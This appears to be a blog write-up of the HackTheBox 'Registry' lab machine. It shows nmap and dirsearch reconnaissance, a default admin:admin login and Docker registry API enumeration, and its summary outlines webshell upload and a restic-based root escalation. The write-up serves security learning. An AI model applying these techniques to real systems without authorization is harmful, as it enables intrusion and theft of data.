<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Quick Summary   ‚Üí My very first Hard box is now retired. A machine where you can exploit if you know what the technology is used. The initial scan has give me a big hint that this machine is using Do">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Registry üß∞üóÇÔ∏è">
<meta property="og:url" content="https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/index.html">
<meta property="og:site_name" content="PŒõYŒõ∆ß0">
<meta property="og:description" content="Quick Summary   ‚Üí My very first Hard box is now retired. A machine where you can exploit if you know what the technology is used. The initial scan has give me a big hint that this machine is using Do">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-info.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-nginx.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-404-page.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-install.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-v2.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-response-header.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-bolt-image.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-list.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-manifest.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-latest.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-rsa-key.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-bolt-page.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-bolt-login.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-dashboard.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-config-default.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-config-edited.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-uploaded.png">
<meta property="og:image" content="https://ph-payas0.github.io/img/registry/registry-pownyshell.png">
<meta property="og:image" content="https://www.hackthebox.eu/badge/image/128965">
<meta property="article:published_time" content="2020-04-04T19:04:24.000Z">
<meta property="article:modified_time" content="2020-06-09T21:44:44.059Z">
<meta property="article:author" content="medz">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="retired">
<meta property="article:tag" content="docker">
<meta property="article:tag" content="registry">
<meta property="article:tag" content="cms">
<meta property="article:tag" content="restic">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ph-payas0.github.io/img/registry/registry-info.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon-1.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>HackTheBox - Registry üß∞üóÇÔ∏è</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="PŒõYŒõ∆ß0" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/projects/">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020-04-11/HackTheBox-Traverxec/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020-03-29/HackTheBox-Sniper/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&text=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&title=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&is_video=false&description=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - Registry üß∞üóÇÔ∏è&body=Check out this article: https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&title=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&title=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&title=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&title=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&name=HackTheBox - Registry üß∞üóÇÔ∏è&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&t=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-results"><span class="toc-number">3.2.</span> <span class="toc-text">Nmap results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bruteforce-Web-directories"><span class="toc-number">4.1.</span> <span class="toc-text">Bruteforce Web directories</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-install-file"><span class="toc-number">4.2.</span> <span class="toc-text">Get install file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Explore-Docker-Registry"><span class="toc-number">4.3.</span> <span class="toc-text">Explore Docker Registry</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post - Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Diving-the-Docker-Repository"><span class="toc-number">5.1.</span> <span class="toc-text">Diving the Docker Repository</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploring-the-blobSums"><span class="toc-number">5.2.</span> <span class="toc-text">Exploring the blobSums</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hunting-the-Private-key"><span class="toc-number">5.3.</span> <span class="toc-text">Hunting the Private key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-in-into-the-REGISTRY"><span class="toc-number">5.4.</span> <span class="toc-text">Get in into the REGISTRY</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Registry-Basic-Information"><span class="toc-number">6.1.</span> <span class="toc-text">Registry Basic Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BOLT-CMS-WEBSITE"><span class="toc-number">6.2.</span> <span class="toc-text">BOLT CMS WEBSITE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RESTIC-BACKUP-PROGRAM"><span class="toc-number">7.1.</span> <span class="toc-text">RESTIC BACKUP PROGRAM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SETTING-UP-THE-SERVER"><span class="toc-number">7.2.</span> <span class="toc-text">SETTING UP THE SERVER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CREATING-BACKUPS"><span class="toc-number">7.3.</span> <span class="toc-text">CREATING BACKUPS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-THE-ADMIN-SHELL"><span class="toc-number">7.4.</span> <span class="toc-text">GET THE ADMIN SHELL</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
        <div class="content index py4">
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Registry üß∞üóÇÔ∏è
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">PŒõYŒõ∆ß0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-04-04T19:04:24.000Z" itemprop="datePublished">05-04-2020</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/HackTheBox/">HackTheBox</a> ‚Ä∫ <a class="category-link" href="/categories/HackTheBox/PenTesting/">PenTesting</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/cms/" rel="tag">cms</a>, <a class="tag-link" href="/tags/docker/" rel="tag">docker</a>, <a class="tag-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link" href="/tags/registry/" rel="tag">registry</a>, <a class="tag-link" href="/tags/restic/" rel="tag">restic</a>, <a class="tag-link" href="/tags/retired/" rel="tag">retired</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><img src="/img/registry/registry-info.png" alt="HackTheBox-Registry" title="Registry machine details"></p>
<h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   ‚Üí My very first Hard box is now retired. A machine where you can exploit if you know what the technology is used. The initial scan has give me a big hint that this machine is using <a href="https://www.docker.com/" target="_blank" rel="noopener">Docker</a> and 3rd party server named <code>REGISTRY Server</code>.<br>   And in the server there‚Äôs a lot container which I downloaded and find an <code>SSH Key</code> to get in to the machine and get the <code>user.txt</code>.<br>   On my Privilege Escalation to the box‚Äô I found out that I need to do lateral movement to the <code>www-data</code> shell which basically the webserver. From that, user can abuse <code>SUDOERS rights</code> by running the <code>Restic</code> and create a backup for root directory to my Kali Linux machine and get the shell and <code>root.txt</code>.</p>
<hr>
<h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol>
<li><p><strong>Network Scanning</strong></p>
<p>‚Üí Nmap scan</p>
<p>‚Üí discover open ports and what services are running</p>
</li>
<li><p><strong>Enumeration</strong></p>
<p>‚Üí Browsing the HTTP Service</p>
<p>‚Üí put the <code>commonName</code> in <code>/etc/hosts/</code> file that appear on the <strong><em>Nmap Scan</em></strong></p>
<p>‚Üí Download and analyze the <code>install file</code></p>
<p>‚Üí Visit the <code>docker.registry.htb</code> and Look for interesting stuff in a <strong><em>Docker API</em></strong></p>
</li>
<li><p><strong>Post - Exploitation</strong></p>
<p>‚Üí Enumerating the <strong><em>Docker API</em></strong> by following this <a href="https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/" target="_blank" rel="noopener">method</a></p>
<p>‚Üí Found the docker repository that contains image called <strong><em>bolt-image</em></strong></p>
<p>‚Üí Found the some blobs file from <code>latest</code></p>
<p>‚Üí Download all the blob files and try to look for a password or ssh key</p>
<p>‚Üí Get in to the Registry machine</p>
</li>
<li><p><strong>Exploitation</strong></p>
<p>‚Üí Enumerate the <strong><em>Bolt CMS Website</em></strong></p>
<p>‚Üí using <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" target="_blank" rel="noopener">LinPEAS</a> i found a hash that I can use for password of the website</p>
<p>‚Üí Looking at configuration I modify the <code>config.yml</code> and upload 2 webshells as fast as I can to gain <code>www-data</code> shell.</p>
</li>
<li><p><strong>Privilege Escalation</strong></p>
<p>‚Üí Abuse what <code>www-data</code> allowed to run which is the restic</p>
<p>‚Üí create snapshot on my Kali linux machine which will be the backup server for restic</p>
<p>‚Üí do reverse SSH in <code>bolt user shell</code></p>
<p>‚Üí run the restic on <code>www-data</code> and backup the root directory that will transfer into my machine.</p>
<p>‚Üí get the <code>id_rsa</code> key on ssh folder, and login as root.</p>
<p>‚Üí Finally rooted and got the root.txt</p>
</li>
</ol>
<hr>
<h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>‚Üí First, I run the <strong><em>NMAP</em></strong> to scan the target and get information about the various services that are running on the target machine. I use</p>
<hr>
<ul>
<li>-sV      ‚áí Probe open ports to determine service/version info</li>
<li>-sC      ‚áí equivalent to ‚Äîscript=default</li>
<li>-T 0-5   ‚áí Set timing template - higher is faster (less accurate)</li>
<li>-p-      ‚áí Scan all 65535 ports</li>
<li>-oN      ‚áí to save our scan results to a text file</li>
</ul>
<hr>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -p- -T4 <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span> -oN nmap-Registry</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ nmap -sV -sC -p- -T4 <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span> -oN nmap-Registry</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-04-04 06:26 PST</span></span><br><span class="line">Warning: <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span> <span class="function">giving up <span class="keyword">on</span> port because retransmission cap <span class="title">hit</span> (<span class="params"><span class="number">6</span></span>).</span></span><br><span class="line"><span class="function">Nmap scan report <span class="keyword">for</span> 10.10.10.159</span></span><br><span class="line"><span class="function">Host <span class="keyword">is</span> <span class="title">up</span> (<span class="params"><span class="number">0.25</span>s latency</span>).</span></span><br><span class="line"><span class="function">Not shown: 65458 closed ports, 74 filtered ports</span></span><br><span class="line"><span class="function">PORT    STATE SERVICE  VERSION</span></span><br><span class="line"><span class="function">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (<span class="params">Ubuntu Linux; protocol <span class="number">2.0</span></span>)</span></span><br><span class="line"><span class="function">| ssh-hostkey: </span></span><br><span class="line"><span class="function">|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (<span class="params">RSA</span>)</span></span><br><span class="line"><span class="function">|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6<span class="title">d</span> (<span class="params">ECDSA</span>)</span></span><br><span class="line"><span class="function">|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (<span class="params">ED25519</span>)</span></span><br><span class="line"><span class="function">80/tcp  open  http     nginx 1.14.0 (<span class="params">Ubuntu</span>)</span></span><br><span class="line"><span class="function">|_http-server-header: nginx/1.14.0 (<span class="params">Ubuntu</span>)</span></span><br><span class="line"><span class="function">|_http-title: Welcome to nginx!</span></span><br><span class="line"><span class="function">443/tcp open  ssl/http nginx 1.14.0 (<span class="params">Ubuntu</span>)</span></span><br><span class="line"><span class="function">|_http-server-header: nginx/1.14.0 (<span class="params">Ubuntu</span>)</span></span><br><span class="line"><span class="function">|_http-title: Welcome to nginx!</span></span><br><span class="line"><span class="function">| ssl-cert: Subject: commonName</span>=docker.registry.htb</span><br><span class="line">| Not valid before: <span class="number">2019</span><span class="number">-05</span><span class="number">-06</span>T21:<span class="number">14</span>:<span class="number">35</span></span><br><span class="line">|_Not valid after:  <span class="number">2029</span><span class="number">-05</span><span class="number">-03</span>T21:<span class="number">14</span>:<span class="number">35</span></span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: <span class="number">1</span> <span class="function">IP <span class="title">address</span> (<span class="params"><span class="number">1</span> host up</span>) scanned <span class="keyword">in</span> 1218.67 seconds</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">root <span class="keyword">in</span> htb/boxes/Registry took 20m19s </span></span><br><span class="line"><span class="function">‚ùØ</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there‚Äôs port open.</p>
<ul>
<li>22      ‚áí which basically use for SSH Connections</li>
<li>80       ‚áí which basically running HTTP Service</li>
<li>443       ‚áí which running also HTTP/S and have ssl-cert ‚Äì commonName=docker.registry.htb, I added that on my hosts file.</li>
</ul>
<hr>
<hr>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>So I always visit first the HTTP service because that is a website and I got default page of a <code>Nginx Server</code>.</p>
<p><img src="/img/registry/registry-nginx.png" alt="HackTheBox-Registry" title="Registry NGINX"></p>
<p>There‚Äôs no hint for that so i try enumerate the website using <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> <code>Web path scanner</code> to look for website page or items which can give me a hints.</p>
<h3 id="Bruteforce-Web-directories"><a href="#Bruteforce-Web-directories" class="headerlink" title="Bruteforce Web directories"></a>Bruteforce Web directories</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ python3 /opt/dirsearch/dirsearch.py -u <span class="string">"http://10.10.10.159/"</span> -e asd -t 20 --simple-report=registry-directories</span><br><span class="line"></span><br><span class="line"> _|. _ _  _  _  _ _|_    v0.3.9</span><br><span class="line">(_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: asd | HTTP method: get | Threads: 20 | Wordlist size: 6109</span><br><span class="line"></span><br><span class="line">Error Log: /opt/dirsearch/logs/errors-20-04-04_07-13-49.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.159/</span><br><span class="line"></span><br><span class="line">[07:13:49] Starting: </span><br><span class="line">[07:13:51] 400 -  182B  - /%2e%2e/google.com</span><br><span class="line">[07:13:51] 403 -  580B  - /.bash_history  </span><br><span class="line">[07:13:53] 403 -  580B  - /.ht_wsr.txt                              </span><br><span class="line">[07:13:53] 403 -  580B  - /.hta</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess-dev</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess-local</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess-marco</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.BAK</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.bak1</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.old</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.orig</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.sample</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.txt</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess.save</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess_extra</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess_orig</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess_sc</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccessBAK</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccessOLD</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccessOLD2</span><br><span class="line">[07:13:53] 403 -  580B  - /.htaccess~</span><br><span class="line">[07:13:53] 403 -  580B  - /.htgroup</span><br><span class="line">[07:13:53] 403 -  580B  - /.htpasswd-old</span><br><span class="line">[07:13:53] 403 -  580B  - /.htpasswd_test</span><br><span class="line">[07:13:53] 403 -  580B  - /.htpasswds</span><br><span class="line">[07:13:53] 403 -  580B  - /.htusers</span><br><span class="line">[07:14:05] 403 -  580B  - /admin/.htaccess                                       </span><br><span class="line">[07:14:13] 403 -  580B  - /administrator/.htaccess                                                          </span><br><span class="line">[07:14:17] 403 -  580B  - /app/.htaccess                                                                          </span><br><span class="line">[07:14:44] 200 -  612B  - /index.html                                                                          </span><br><span class="line">[07:14:45] 301 -  194B  - /install  -&gt;  http://10.10.10.159/install/</span><br><span class="line">[07:14:45] 200 -    1KB - /install/         </span><br><span class="line">                                                                                                                  </span><br><span class="line">Task Completed</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry took 2m4s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>
<h3 id="Get-install-file"><a href="#Get-install-file" class="headerlink" title="Get install file"></a>Get install file</h3><p>I only got one which is the <code>install</code> when I added it into the URL it is <code>404 Page Not found.</code></p>
<p><img src="/img/registry/registry-404-page.png" alt="HackTheBox-Registry" title="Registry 404"></p>
<p>but I manage to download the <code>install</code> using <code>wget</code></p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ wget http:<span class="comment">//10.10.10.159/install</span></span><br><span class="line">-<span class="number">-2020</span><span class="number">-04</span><span class="number">-04</span> <span class="number">07</span>:<span class="number">27</span>:<span class="number">30</span>--  http:<span class="comment">//10.10.10.159/install</span></span><br><span class="line">Connecting to <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span>:<span class="number">80.</span>.. connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">301</span> Moved Permanently</span><br><span class="line">Location: http:<span class="comment">//10.10.10.159/install/ [following]</span></span><br><span class="line">-<span class="number">-2020</span><span class="number">-04</span><span class="number">-04</span> <span class="number">07</span>:<span class="number">27</span>:<span class="number">30</span>--  http:<span class="comment">//10.10.10.159/install/</span></span><br><span class="line">Reusing existing connection to <span class="number">10.10</span><span class="number">.10</span><span class="number">.159</span>:<span class="number">80.</span></span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: unspecified [text/html]</span><br><span class="line">Saving to: ‚Äòinstall‚Äô</span><br><span class="line"></span><br><span class="line">install                                            [ &lt;=&gt;                                                                                                ]   <span class="number">1.03</span>K  --.-KB/s    <span class="keyword">in</span> <span class="number">0</span>s      </span><br><span class="line"></span><br><span class="line"><span class="number">2020</span><span class="number">-04</span><span class="number">-04</span> <span class="number">07</span>:<span class="number">27</span>:<span class="number">31</span> (<span class="number">81.5</span> MB/s) - ‚Äòinstall‚Äô saved [<span class="number">1050</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>So I thought this was only ordinary a text file but it‚Äôs not, is a gzip file so I tried to move into a gzip and decompressed but it‚Äôs not working, and I don‚Äôt whats wrong so I move on and go the the next phase.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ file install</span><br><span class="line">install: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200 gzip compressed data, reserved method, has CRC, was <span class="string">""</span>, from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772200</span><br></pre></td></tr></table></figure>

<p><img src="/img/registry/registry-install.png" alt="HackTheBox-Registry" title="Registry Install file"></p>
<h3 id="Explore-Docker-Registry"><a href="#Explore-Docker-Registry" class="headerlink" title="Explore Docker Registry"></a>Explore Docker Registry</h3><p>Next, i visited the <code>docker.registry.htb</code> and there will be a popup login requesting for username and password, I input <code>admin:admin</code> on that and it‚Äôs displaying a <code>JSON API</code> page.</p>
<p><img src="/img/registry/registry-v2.png" alt="HackTheBox-Registry" title="Registry JSON API"></p>
<p>and the <code>JSON API</code></p>
<p><img src="/img/registry/registry-response-header.png" alt="HackTheBox-Registry" title="Registry JSON API"></p>
<hr>
<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><p>Next, I search for <code>Docker api registry exploitation</code> and I didn‚Äôt failed. I found this awesome <a href="https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/" target="_blank" rel="noopener">article</a> which help me to get a password for SSH Key by exploring each blobs file.</p>
<p>So based on the method of the article, I look first at the <code>/v2/_catalog</code> and there‚Äôs a docker repository called <code>&quot;bolt-image&quot;</code> and it is basically a collection of related images.</p>
<h3 id="Diving-the-Docker-Repository"><a href="#Diving-the-Docker-Repository" class="headerlink" title="Diving the Docker Repository"></a>Diving the Docker Repository</h3><p><img src="/img/registry/registry-bolt-image.png" alt="HackTheBox-Registry" title="Registry bolt-image"></p>
<p>Next I added <code>/tags/list</code> and there was repository install called <code>latest</code></p>
<p><img src="/img/registry/registry-list.png" alt="HackTheBox-Registry" title="Registry Repo list"></p>
<p>trying to look at the <code>/manifest/v2</code></p>
<p><img src="/img/registry/registry-manifest.png" alt="HackTheBox-Registry" title="Registry Latest"></p>
<p>To download the file <code>latest</code> I added simply this in the url <code>/manifest/latest</code>.</p>
